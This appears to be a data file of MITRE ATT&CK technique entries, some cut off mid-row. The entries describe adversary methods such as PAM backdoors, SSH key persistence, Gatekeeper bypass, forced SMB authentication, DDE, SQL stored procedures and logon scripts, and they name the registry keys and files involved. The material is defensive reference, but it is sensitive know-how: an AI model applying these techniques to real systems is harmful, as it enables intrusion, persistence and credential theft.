[1]    Use of the  KernelCallbackTable  to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",Description

T1484.002,Domain Policy Modification: Domain Trust Modification,"Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.   [1]    These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.   Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge  SAML Tokens , without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert a domain to a federated domain, which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.   [2]",Description

T1059,Command and Scripting Interpreter,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of  Unix Shell  while Windows installations include the  Windows Command Shell  and  PowerShell .   There are also cross-platform interpreters such as  Python , as well as those commonly associated with client applications such as  JavaScript  and  Visual Basic .   Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in  Initial Access  payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various  Remote Services  in order to achieve remote Execution.   [1]      [2]      [3]",Description

T1556.003,Modify Authentication Process: Pluggable Authentication Modules,"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is  pam_unix.so , which retrieves, sets, and verifies account authentication information in  /etc/passwd  and  /etc/shadow .   [1]      [2]      [3]      Adversaries may modify components of the PAM system to create backdoors. PAM components, such as  pam_unix.so , can be patched to accept arbitrary adversary supplied values as legitimate credentials.   [4]      Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.

T1027.009,Obfuscated Files or Information: Embedded Payloads,"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to  Subvert Trust Controls  by not impacting execution controls such as digital signatures and notarization tickets.   [1]       Adversaries may embed payloads in various file formats to hide payloads.   [2]    This is similar to  Steganography , though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.   [3]       For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.   [4]    Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.   [5]       Embedded content may also be used as  Process Injection  payloads used to infect benign system processes.   [6]    These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.   [7]",Description

T1553.001,Subvert Trust Controls: Gatekeeper Bypass,"Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.   [1]      [2]      Based on an opt-in system, when files are downloaded an extended attribute (xattr) called  com.apple.quarantine  (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:   Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g.  Exploitation for Defense Evasion ), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.   [5]      [6]      Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using  Drive-by Compromise .",Description

Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex:  Social Media  or  Search Victim-Owned Websites ).   [1]    Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information  or  Search Open Websites/Domains ), establishing operational resources (ex:  Establish Accounts  or  Compromise Accounts ), and/or initial access (ex:  Supply Chain Compromise  or  Trusted Relationship )",Description
T1059.004,Command and Scripting Interpreter: Unix Shell,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.   [1]      [2]    Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.   Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.   Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with  SSH .

T1608.005,Stage Capabilities: Link Target,"Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in  Malicious Link . Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in  Spearphishing Link ) or a phish to gain initial access to a system (as in  Spearphishing Link ), an adversary must set up the resources for a link target for the spearphishing link.    Typically, the resources for a link target will be an HTML page that may include some client-side script such as  JavaScript  to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during  Spearphishing Link .   [1]      [2]    Adversaries may also  Upload Malware  and have the link target point to malware for download/execution by the user.

T1574.010,Hijack Execution Flow: Services File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.   Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level.

Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.   [1]       When used maliciously, LKMs can be a type of kernel-mode  Rootkit  that run with the highest operating system privilege (Ring 0).   [2]    Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.   [3]      Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through  kextload  and  kextunload  commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.   [4]      Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as ""Legacy System Extensions"" since there is no System Extension for Kernel Programming Interfaces.   [5]      Adversaries can use LKMs and kexts to conduct  Persistence  and/or  Privilege Escalation  on a system. Examples have been found in the wild, and there are some relevant open source projects as well.   [6]      [7]      [8]      [9]      [10]      [11]      [12]      [13]",Description

T1578.004,Modify Cloud Compute Infrastructure: Revert Cloud Instance,"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.   Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.   [1]      [2]",Description
T1218.002,System Binary Proxy Execution: Control Panel,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.   Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a  CPlApplet  function.   [1]      [2]    For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.   [1]    Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.   [1]       [2]      [3]      Malicious Control Panel items can be delivered via  Phishing  campaigns   [2]      [3]    or executed as part of multi-stage malware.   [4]    Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.   Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to  HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls . Even when these registered DLLs do not comply with the CPL file specification and do not export  CPlApplet  functions, they are loaded and executed through its  DllEntryPoint  when Control Panel is executed. CPL files not exporting  CPlApplet  are not directly executable.   [5]",Description

T1027.001,Obfuscated Files or Information: Binary Padding,"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.    Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.   [1]    The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.   [2]    Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.   [3]",Description

T1596.003,Search Open Technical Databases: Digital Certificates,"Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.   Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.   [1]    Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).   [2]    Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Active Scanning  or  Phishing for Information ), establishing operational resources (ex:  Develop Capabilities  or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services  or  Trusted Relationship ).",Description
T1112,Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.   Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility  Reg  may be used for local or remote Registry modification.    [1]    Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.   Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via  Reg  or other utilities using the Win32 API.    [2]    Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.    [3]       [4]      The Registry of a remote system may be modified to aid in execution of files as part of lateral movement.

T1205.002,Traffic Signaling: Socket Filters,"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the  libpcap  library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.   To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.   [1]    Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with  Protocol Tunneling .   [2]      [3]      Filters can be installed on any Unix-like platform with  libpcap  installed or on Windows hosts using  Winpcap .  Adversaries may use either  libpcap  with  pcap_setfilter  or the standard library function  setsockopt  with  SO_ATTACH_FILTER  options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",Description

[1]    Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.   [2]    Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.   [3]      [4]      Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.

VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.   [3]      [4]    VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of  JavaScript  on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).   [5]      Adversaries may use VB payloads to execute malicious commands.

T1098.004,Account Manipulation: SSH Authorized Keys,"Adversaries may modify the SSH  authorized_keys  file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The  authorized_keys  file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under  &lt;user-home&gt;/.ssh/authorized_keys .   [1]    Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value ""yes"" to ensure public key and RSA authentication are enabled. The SSH config file is usually located under  /etc/ssh/sshd_config .   Adversaries may modify SSH  authorized_keys  files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s ""add-metadata"" command an adversary may add SSH keys to a user account.   [2]      [3]    Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.   [4]    This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.   [5]      [6]      Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user.",Description

T1199,Trusted Relationship,"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.   Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such,  Valid Accounts  used by the other party for access to internal network systems may be compromised and used.   [1]      In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.

T1187,Forced Authentication,"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.   The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.    [1]    This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.   Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.    [2]       [3]      Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e.  Template Injection ), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.    [4]    With access to the credential hash, an adversary can perform off-line  Brute Force  cracking to gain access to plaintext credentials.    [5]      There are several different ways this can occur.    [6]    Some specifics from in-the-wild use include:",Description

T1187,Forced Authentication,EnvyScout  can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure.   [11],Procedure Examples
T1599.001,Network Boundary Bridging: Network Address Translation Traversal,"Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.   Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.   [1]      When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.     Adversaries may use  Patch System Image  to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",Description
T1546.002,Event Triggered Execution: Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.   [1]    The Windows screensaver application scrnsave.scr is located in  C:\Windows\System32\ , and  C:\Windows\sysWOW64\   on 64-bit Windows systems, along with screensavers included with base Windows installations.   The following screensaver settings are stored in the Registry ( HKCU\Control Panel\Desktop\ ) and could be manipulated to achieve persistence:   Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.   [2]",Description
T1546.002,Event Triggered Execution: Screensaver,Gazer  can establish persistence through the system screensaver by configuring it to execute the malware.   [2],Procedure Examples
T1586,Compromise Accounts,"Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e.  Establish Accounts ), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.    A variety of methods exist for compromising accounts, such as gathering credentials via  Phishing for Information , purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).   [1]    Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.   Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.   Adversaries may directly leverage compromised email accounts for  Phishing for Information  or  Phishing .",Description
T1505.001,Server Software Component: SQL Stored Procedures,"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).   Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.   [1]      [2]    To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.   [1]      [2]      [3]       Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).   [4]    Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.   [5]",Description
T1505.001,Server Software Component: SQL Stored Procedures,Sandworm Team  has used various MS-SQL stored procedures.   [6],Procedure Examples
T1505.001,Server Software Component: SQL Stored Procedures,Stuxnet  used xp_cmdshell to store and execute SQL code.   [7],Procedure Examples
T1559.002,Inter-Process Communication: Dynamic Data Exchange,"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.   Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by  Component Object Model , DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.   [1]      [2]      [3]      Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via  Phishing  campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.   [4]      [5]      [6]      [7]    Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.   [8]      [9]      DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a  Command and Scripting Interpreter . DDE execution can be invoked remotely via  Remote Services  such as  Distributed Component Object Model  (DCOM).   [10]",Description

T1584.001,Compromise Infrastructure: Domains,"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.   [1]    Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.   [2]      Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.   [3]",Description

T1552.003,Unsecured Credentials: Bash History,"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s  .bash_history  file. For each user, this file resides at the same location:  ~/.bash_history . Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.    [1]",Description

T1574.005,Hijack Execution Flow: Executable Installer File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.   Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the  %TEMP%  directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of  DLL Search Order Hijacking .   Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to  Bypass User Account Control . Several examples of this weakness in existing common installers have been reported to software vendors.   [1]        [2]    If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",Description
T1055,Process Injection,"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.    There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.    More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",Description

T1203,Exploitation for Client Execution,"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.   Several types exist:   Web browsers are a common target through  Drive-by Compromise  and  Spearphishing Link . Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.   Common office and productivity applications such as Microsoft Office are also targeted through  Phishing . Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.   Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",Description

T1543.004,Create or Modify System Process: Launch Daemon,"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in  /System/Library/LaunchDaemons/  and  /Library/LaunchDaemons/ . Required Launch Daemons parameters include a  Label  to identify the task,  Program  to provide a path to the executable, and  RunAtLoad  to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.   [1]      [2]      [3]      Adversaries may install a Launch Daemon configured to execute at startup by using the  RunAtLoad  parameter set to  true  and the  Program  parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e.  Masquerading ). When the Launch Daemon is executed, the program inherits administrative permissions.   [4]      [5]      Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as  usr/local/bin  to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.   [6]      [7]",Description

T1550,Use Alternate Authentication Material,"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.    Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.   [1]      [2]      Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through  Credential Access  techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",Description

T1546.013,Event Triggered Execution: PowerShell Profile,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  ( profile.ps1 ) is a script that runs when  PowerShell  starts and can be used as a logon script to customize user environments.    PowerShell  supports several profiles depending on the user or host program. For example, there can be different profiles for  PowerShell  host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.    [1]       Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or  PowerShell  drives to gain persistence. Every time a user opens a  PowerShell  session the modified script will be executed unless the  -NoProfile  flag is used when it is launched.    [2]       An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.    [3]",Description
T1546.013,Event Triggered Execution: PowerShell Profile,Turla  has used PowerShell profiles to maintain persistence on an infected machine.   [2],Procedure Examples
T1601,Modify System Image,"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.   To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",Description
T1037,Boot or Logon Initialization Scripts,"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.     Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.    An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",Description

T1037.001,Boot or Logon Initialization Scripts: Logon Script (Windows),"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.   [1]    This is done via adding a path to a script to the  HKCU\Environment\UserInitMprLogonScript  Registry key.   [2]      Adversaries may use these scripts to maintain persistence on a single system.

T1534,Internal Spearphishing,"Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.   [1]      Adversaries may leverage  Spearphishing Attachment  or  Spearphishing Link  as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through  Input Capture  on sites that mimic email login interfaces.   There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.   [1]    The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the campaign and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.

T1056.002,Input Capture: GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex:  Bypass User Account Control ).   Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.   [1]    This type of prompt can be used to collect credentials via various languages such as  AppleScript    [2]      [3]      [4]    and  PowerShell .

